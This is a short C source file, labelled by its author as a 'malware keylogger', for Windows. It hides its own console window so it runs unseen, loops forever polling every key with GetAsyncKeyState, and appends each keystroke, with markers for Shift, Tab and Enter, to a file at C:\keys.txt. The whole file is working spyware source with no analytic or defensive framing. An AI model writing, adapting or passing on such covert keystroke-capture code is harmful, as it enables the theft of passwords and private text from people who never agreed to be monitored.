/* malware keylogger 
coded by vold */
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define LOG "C:\\keys.txt"
#define wf fprintf
#define MAX_BUF 1024

#define TRUE 1
#define FALSE 0

void  getkey( void );
void * checarkey( int );
void * WriDat( char *string );

void * die(char *str, int erro) {
	wf(stderr, "%s", str);
	exit(erro);
	
	return ( void *)0;
}

int main( int argc, char *argv[] ) {
	getkey();	
	return 0;
}

void * WriDat( char *string ) {
    	FILE *ptrarquivo = NULL;
    	ptrarquivo = fopen(LOG, "a+");
    	 
    	  if ( ptrarquivo == NULL) {
    	  	 die("erro ao abrir arquivo. \n", -1);
		  }
		fputs(string, ptrarquivo);
		fclose(ptrarquivo);
		  
}

void * checarkey(int key) {
	 switch(key) {
	     case VK_SPACE:
	     	WriDat(" ");
	     	break;
	     case VK_RETURN:
	     	WriDat("\n");
	     	break;
	    case VK_SHIFT:
	    	WriDat(" [SHIFT] ");
	    	break;
	    case VK_OEM_PERIOD:
	    	WriDat(".");
	    	break;
	    case VK_BACK:
	    	WriDat("\b");
	    	break;
	    case VK_TAB:
	    	WriDat(" [TAB] " );
	    	break;
	    	default:
	    		return FALSE;
	 }

}

void getkey( void ) {
    unsigned char key;
    
    HWND ft; // não deixar a janela visível 
    AllocConsole();
	ft = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(ft, 0);
		 while (TRUE) {
		 	
		 	 Sleep(2);
		 	 for (key = 8; key<=255; key++) {
		 	 	 if (GetAsyncKeyState(key) == -32767) {
		 	 	 	  if(checarkey(key) == FALSE) {
    	                  FILE *ptrarquivo = fopen(LOG, "a+");
		 	 	 	  	  wf(ptrarquivo, "%c", key);
		                  fclose(ptrarquivo);
		                  
					  }
				   }
				   if (key == 255) {
				   	   key = 8;
				   }
			  }
		 }
    	
} 


